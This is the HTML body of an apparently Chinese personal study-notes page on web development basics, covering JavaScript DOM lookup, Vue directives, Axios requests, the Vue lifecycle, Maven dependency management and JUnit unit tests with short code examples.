class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> h1=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;h1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>2.根据标签名获取，返回Element对象数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divs=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>);</span><br></pre></td></tr></table></figure><p>3.根据name属性值获取，返回Element对象数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hobbys=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;hobby&#x27;</span>);</span><br></pre></td></tr></table></figure><p>4.根据class属性值获取，返回Element对象数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="property">var</span> <span class="keyword">class</span>=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="js事件监听"><a href="#js事件监听" class="headerlink" title="js事件监听"></a>js事件监听</h4><p>事件：html事件时发生在html上元素的“事情”</p><p>例如：按钮被点击。。。</p><p>事件监听：js可以在事件被侦测到时执行指定的代码</p><p>事件绑定</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251120694.png" alt="image-20250725112026653" loading="lazy"></p><p>常见事件</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251125544.png" alt="image-20250725112555509" loading="lazy"></p><h3 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h3><p>Vue是一个用于构建用户界面的渐进式js框架</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507280856720.png" alt="image-20250728085647555" loading="lazy"></p><p>框架:就是一套完整的项目解决方案，用于快速构建项目</p><p>优点：提高前端项目的开发效率</p><p>缺点：要理解记忆框架使用规则</p><h4 id="vue模块的引入"><a href="#vue模块的引入" class="headerlink" title="vue模块的引入"></a>vue模块的引入</h4><p>准备</p><ul><li>引入Vue模块</li><li>创建Vue程序的应用实例，控制视图的元素</li><li>准备元素(div)被Vue控制</li></ul><p>创建驱动视图</p><ul><li>准备数据</li><li>通过插值表达式渲染页面</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span>&#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;https://unpkg.com/vue@3/dist/vue.esm-browser.js&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">createApp</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&quot;Hello Vue&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;).<span class="title function_">mount</span>(<span class="string">&quot;#app&quot;</span>);</span></span><br></pre></td></tr></table></figure><h4 id="vue常用指令"><a href="#vue常用指令" class="headerlink" title="vue常用指令"></a>vue常用指令</h4><p>指令：HTML标签上带有v-前缀的特殊属性，不同的指令具有不同的含义，可以实现不同的功能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p v-xxx=<span class="string">&quot;...&quot;</span>&gt;...&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>常用指令</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507280917315.png" alt="image-20250728091713271" loading="lazy"></p><p>插值表达式不能出现在标签内部</p><h5 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h5><p>作用：列表渲染，遍历容器的元素或者对象的属性</p><p>语法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr v-<span class="keyword">for</span>=<span class="string">&quot;(item,index) in items&quot;</span>:key=<span class="string">&quot;item.id&quot;</span>&gt; &#123;&#123;item&#125;&#125;&lt;/tr&gt;</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><p>items为遍历的数组</p><p>item为遍历出来的元素</p><p>index为索引&#x2F;下标，从o开始；可以省略，省略index语法:v-for&#x3D;”item in items</p><p><strong>key:</strong></p><p>作用：给元素添加的唯一标识，便于vue进行列表项的正确排序复用，提升渲染性能</p><p>推荐使用id作为key(唯一)，不推荐使用index作为key(会变化)</p><p>注意：遍历的数组，必须在data中定义;要想让哪个标签循环展示多次，就在哪个标签上使用v-for指令。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(emp, index) in employees&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;emp.id&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123; index + 1 &#125;&#125;. 姓名：&#123;&#123; emp.name &#125;&#125; | 职位：&#123;&#123; emp.position &#125;&#125; | 年龄：&#123;&#123; emp.age &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span>&#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;https://unpkg.com/vue@3/dist/vue.esm-browser.js&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">createApp</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="attr">employees</span>:[</span></span><br><span class="line"><span class="language-javascript">                   &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">position</span>: <span class="string">&#x27;前端工程师&#x27;</span>, <span class="attr">age</span>: <span class="number">25</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">                   &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">position</span>: <span class="string">&#x27;后端工程师&#x27;</span>, <span class="attr">age</span>: <span class="number">28</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">                   &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;王五&#x27;</span>, <span class="attr">position</span>: <span class="string">&#x27;产品经理&#x27;</span>, <span class="attr">age</span>: <span class="number">30</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">                   &#123; <span class="attr">id</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&#x27;赵六&#x27;</span>, <span class="attr">position</span>: <span class="string">&#x27;测试工程师&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span> &#125;</span></span><br><span class="line"><span class="language-javascript">               ]</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;).<span class="title function_">mount</span>(<span class="string">&quot;#app&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h5><p>作用：动态为HTML标签绑定属性值，如设置href，src，style样式等</p><p>语法:v-bind:属性名&#x3D;”属性值” </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img v-<span class="attr">bind</span>:src=<span class="string">&quot;item.image&quot;</span> width=<span class="string">&quot;30px&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>简化：属性名&#x3D;“属性值”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img :src=<span class="string">&quot;item.image&quot;</span> width=<span class="string">&quot;30px&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>注意：动态的为标签的属性绑定值，不能使用插值表达式，得使用v-bind指令。且绑定的数据，必须在data中定义。</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281005134.png" alt="image-20250728100519100" loading="lazy"></p><h5 id="v-if-v-show"><a href="#v-if-v-show" class="headerlink" title="v-if&amp;v-show"></a>v-if&amp;v-show</h5><p>作用：这两类指令都是用来控制元素的显示与隐藏的</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281010589.png" alt="image-20250728101035543" loading="lazy"></p><p>注意：v-else-if必须出现在v-if之后，可以出现多个；v-else 必须出现在v-if&#x2F;v-else-if之后。</p><p>v-if</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281013180.png" alt="image-20250728101340145" loading="lazy"></p><p>v-show</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281015223.png" alt="image-20250728101536195" loading="lazy"></p><h5 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h5><p>作用：在表单元素上使用，双向数据绑定。可以方便的获取或设置表单项数据</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281029904.png" alt="image-20250728102907861" loading="lazy"></p><h5 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h5><p>作用：为html标签绑定事件(添加事件监听)</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281043178.png" alt="image-20250728104312131" loading="lazy"></p><h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><p>作用：数据交换：通过ajax可以给服务器发送请求，并获取服务器响应的数据</p><p>异步交互：可以在不重新加载整个页面的情况下，与服务器交换数据表格更新部分网页的技术，如搜索联想、用户名是否可用的校验等等</p><h4 id="同步与异步"><a href="#同步与异步" class="headerlink" title="同步与异步"></a>同步与异步</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507290815068.png" alt="image-20250729081519966" loading="lazy"></p><h4 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h4><p>介绍：Axios对原生的Ajax进行了封装，简化书写，快速开发</p><p>官网：<a href="https://www.axios-http.cn/">https://www.axios-http.cn/</a></p><p>步骤：</p><p>引入Axios的js文件（参考官网）</p><p>使用Axios发送请求，并获取响应结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">     <span class="attr">method</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">     <span class="attr">url</span>:<span class="string">&#x27;https://web-server.itheima.net/emps/list&#x27;</span></span><br><span class="line"> &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>)=&gt;</span>&#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>); </span><br><span class="line"> &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span><br><span class="line"> <span class="title function_">alert</span>(err);</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure><p>method:请求方式   url：请求路径  data：请求数据(POST) </p><p>params:发送请求时携带的url参数 如：…?key&#x3D;val</p><p>then({})成功回调函数   catch({})失败回调函数</p><h4 id="请求方式别名"><a href="#请求方式别名" class="headerlink" title="请求方式别名"></a>请求方式别名</h4><p>格式：axios.请求方式(url[,data[,config]])</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507290842566.png" alt="image-20250729084235513" loading="lazy"></p><h4 id="async-await"><a href="#async-await" class="headerlink" title="async&amp;await"></a>async&amp;await</h4><p>可以通过async、await可以让异步变为同步操作。async就是来声明一个异步方法，await是用来等待异步任务执行</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507290917685.png" alt="image-20250729091729614" loading="lazy"></p><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p>指一个对象从创建到销毁的整个过程</p><p>生命周期的八个阶段：每触发一个生命周期事件，会自动执行一个生命周期方法(钩子)，也就是说可以在特定时机执行自己的逻辑代码</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507290947923.png" alt="image-20250729094714875" loading="lazy"></p><p>典型的应用场景：</p><p>在页面加载完毕时，发起异步请求，加载数据，渲染页面</p><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><p>Maven是一款用于管理和构建Java项目的工具，是apache旗下的一个开源项目</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507300853293.png" alt="image-20250730085255162" loading="lazy"></p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507300942274.png" alt="image-20250730094219221" loading="lazy"></p><p>仓库：用于存储资源，管理各种jar包</p><p>本地仓库：自己计算机上的一个目录</p><p>远程仓库：一般由公司团队搭建的私有仓库</p><p>中央仓库：有Maven团队维护的全球唯一性，仓库地址：<a href="https://repol.maven.org/maven2/">https://repol.maven.org/maven2/</a></p><h4 id="maven的编译和打包"><a href="#maven的编译和打包" class="headerlink" title="maven的编译和打包"></a>maven的编译和打包</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507300923146.png" alt="image-20250730092347029" loading="lazy"></p><p>compile会编译整个项目，把源代码编译成可以被 JVM 执行的中间格式（字节码）。</p><p>package会打包整个项目，<strong>将项目编译、打包成可执行的 <code>.jar</code> 或 <code>.war</code> 文件</strong>，通常位于 <code>target/</code> 目录下。</p><h4 id="Maven坐标"><a href="#Maven坐标" class="headerlink" title="Maven坐标"></a>Maven坐标</h4><p>Maven中的坐标是资源(jar)的唯一标识，通过该坐标可以唯一定位资源位置</p><p>使用坐标来定义项目或引入项目中需要的依赖</p><p><strong>Maven坐标主要组成</strong></p><p>groupId：定义当前Maven项目隶属组织名称(通常是域名反写，例如：com.iteima)</p><p>artifactId:定义当前Maven项目名称(通常是模块名称，例如order-sercive、goods-service)</p><p>version：定义当前项目版本号</p><p>Maven项目版本分类</p><ul><li>​SNAPSHOT：功能不稳定，尚处于开发中的版本，即快照版本</li><li>​RELEASE：功能趋于稳定，当前更新停止，可以用于发行的版本</li></ul><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301053867.png" alt="image-20250730105334773" loading="lazy"></p><h4 id="导入Maven项目"><a href="#导入Maven项目" class="headerlink" title="导入Maven项目"></a>导入Maven项目</h4><p>建议选择Maven项目的pom.xml文件进行导入</p><h4 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h4><p>依赖：指当前项目运行所需要的jar包，应该项目中可以引入多个依赖</p><p>配置：</p><p>1.在pom.xml中编写&lt;dependencies&gt;标签</p><p>2.在&lt;dependencies&gt;标签中使用&lt;dependency&gt;引入标签</p><p>3.定义坐标的groupId,artifactId,version</p><p>4.点击刷新按钮，引入最新加入的坐标</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507310928083.png" alt="image-20250731092812942" loading="lazy"></p><p>如果不知道依赖的坐标信息，可以到<a href="https://mvnrepository.com/%E4%B8%AD%E6%90%9C%E7%B4%A2">https://mvnrepository.com/中搜索</a></p><h4 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h4><p>指主动断开依赖的资源，被排除的资源无需指定版本</p><p>用&lt;exclusion&gt;&lt;&#x2F;exclusion&gt;来排除依赖</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507310937280.png" alt="image-20250731093708228" loading="lazy"></p><p>具体作用</p><ol><li><strong>解决依赖冲突</strong><br> 当多个依赖引入了同一个库的不同版本，可能导致运行时错误或编译错误。通过排除其中一个依赖的传递依赖，可以避免版本冲突。</li><li><strong>减小最终包大小</strong><br> 如果某个传递依赖你用不上，可以排除它，减少项目的依赖体积，提升启动速度和构建速度。</li><li><strong>避免重复引入</strong><br> 某些库可能被多次引入不同版本，排除可以避免重复依赖。</li></ol><p>注意：一旦依赖配置变更了，记得重新加载</p><p>引入的依赖本地仓库不存在记得联网</p><h4 id="生命周期-1"><a href="#生命周期-1" class="headerlink" title="生命周期"></a>生命周期</h4><p>Maven的生命周期就是为了对所有的maven项目构建过程进行抽象和统一</p><p>Maven中有三套相互独立的生命周期</p><ul><li>clean:清理工作</li><li>default:核心工作，如：编译、测试、打包、安装、部署</li><li>site：生成报告、发布站点</li></ul><p>执行指定生命周期的两种方式:</p><p>在idea中，右侧的maven工具栏，选中对应的生命周期，双击执行</p><p>在命令行中，通过命令执行</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507311002568.png" alt="image-20250731100241499" loading="lazy"></p><p>生命周期阶段</p><ul><li>clean:溢出上一次构建生成的文件</li><li>compile:编译项目源代码</li><li>test:使用合适的单元测试框架进行测试(junit)</li><li>package:将编译后的文件打包，如jar、war</li><li>install：安装项目到本地仓库</li></ul><p>注意：在同一套生命周期中，当运行后面的阶段时，前面的阶段都会运行</p><h4 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h4><p>测试：用来促进鉴定软件的正确性、完整性、安全性和质量的过程</p><p>阶段划分：单元测试（白盒）、集成测试（灰盒）、系统测试（黑盒）、验收测试（黑盒）</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507311038807.png" alt="image-20250731103827736" loading="lazy"></p><p>测试方法：白盒测试，黑盒测试及灰盒测试</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507311041784.png" alt="image-20250731104128739" loading="lazy"></p><p>单元测试：针对最小的功能单元，编写测试代码对其正确的进行测试</p><p>JUnit：最流行的Java测试框架只有，提供了一些功能，方便程序进行单元测试</p><h5 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a><strong>引入依赖</strong></h5><p>1.在pox.xml中引入JUnit的依赖</p><p>2.在test&#x2F;java目录下创建测试类，并编写对应的测试方法，并在方法上声明@Test注解</p><p>3.运行单元测试(测试通过：绿色，不通过：红色)</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>JUnit单元测试类名命名规范为：XxxxxTest【规范】。JUnit单元测试的方法，必须声明为public void【规定】。</p><h5 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h5><p>JUnit提供了一些辅助方法，用来帮助我们确定被测试的犯法是否按照预期的效果正常工作，这种方式称为断言</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508041028351.png" alt="image-20250804102819237" loading="lazy"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.*;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.params.ParameterizedTest;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.params.provider.ValueSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetAge2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">age</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>().getAge(<span class="string">&quot;110002200505091218&quot;</span>);</span><br><span class="line">        Assertions.assertNotEquals(<span class="number">18</span>, age, <span class="string">&quot;两个值相等&quot;</span>);</span><br><span class="line"><span class="comment">//        String s1 = new String(&quot;Hello&quot;);</span></span><br><span class="line"><span class="comment">//        String s2 = &quot;Hello&quot;;</span></span><br><span class="line"><span class="comment">//        Assertions.assertSame(s1, s2, &quot;不是同一个对象引用&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetGender2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>().getGender(<span class="string">&quot;612429198904201611&quot;</span>);</span><br><span class="line">        Assertions.assertEquals(<span class="string">&quot;男&quot;</span>, gender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="常见注解"><a href="#常见注解" class="headerlink" title="常见注解"></a>常见注解</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508041037122.png" alt="image-20250804103733076" loading="lazy"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@BeforeEach</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBefore</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterEach</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAfter</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@BeforeAll</span> <span class="comment">//该方法必须被static修饰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testBeforeAll</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before all ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterAll</span> <span class="comment">//该方法必须被static修饰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testAfterAll</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after all...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">age</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>().getAge(<span class="string">&quot;110002200505091218&quot;</span>);</span><br><span class="line">        System.out.println(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetGender</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>().getGender(<span class="string">&quot;612429198904201611&quot;</span>);</span><br><span class="line">        System.out.println(gender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508041103661.png" alt="image-20250804110357603" loading="lazy"></p><h3 id="web基础"><a href="#web基础" class="headerlink" title="web基础"></a>web基础</h3><p>那在前面讲解Web前端开发的时候，我们学习了前端网页开发的三剑客HTML、CSS、JS，通过这三项技术，我们就可以制作前端页面了。 那最终，这些个页面资料，我们就可以部署在服务器上，然后打开浏览器就可以直接访问服务器上部署的前端页面了。</p><p><img 